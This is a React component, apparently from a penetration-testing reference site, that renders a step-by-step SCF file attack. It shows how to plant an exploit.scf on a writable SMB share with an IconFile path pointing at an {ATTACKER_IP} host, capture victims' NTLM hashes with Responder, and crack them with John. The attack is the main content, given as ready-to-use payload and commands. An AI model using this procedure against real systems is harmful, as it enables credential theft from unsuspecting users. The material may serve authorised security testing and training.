import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const SCFFileAttack = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Requirements</Typography>
            <Typography>
              You will need unauthenticated write permissions to an SMB file
              share.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Description</Typography>
            <Typography>
              SCF (Shell Command Files) files can be used to perform a limited
              set of operations such as showing the Windows desktop or opening a
              Windows explorer. We can abuse SCF files to to elicit an
              unsuspecting user to submit their NTLMv1/2 hash.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>
              Check if you have write permissions to an SMB share on the victims
              computer.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"smb: \\> put test.txt"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>
              Create a file{" "}
              <Typography display="inline" className="highlight">
                exploit.scf
              </Typography>{" "}
              with the following format:
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"[Shell]\n" +
                "Command=2\n" +
                "IconFile=\\{ATTACKER_IP}share\test.ico\n" +
                "[Taskbar]\n" +
                "Command=ToggleDesktop"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>
              Upload{" "}
              <Typography display="inline" className="highlight">
                exploit.scf
              </Typography>{" "}
              into the SMB share.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"smb: \\> put exploit.scf"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 4</Typography>
            <Typography>
              Start{" "}
              <Typography display="inline" className="highlight">
                responser
              </Typography>{" "}
              to capture the NTLM hash.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"responder -I tun0"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 5</Typography>
            <Typography>
              Use{" "}
              <Typography display="inline" className="highlight">
                John
              </Typography>{" "}
              to crack the hash
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "john --format=netntlmv2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt"
              }
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default SCFFileAttack;
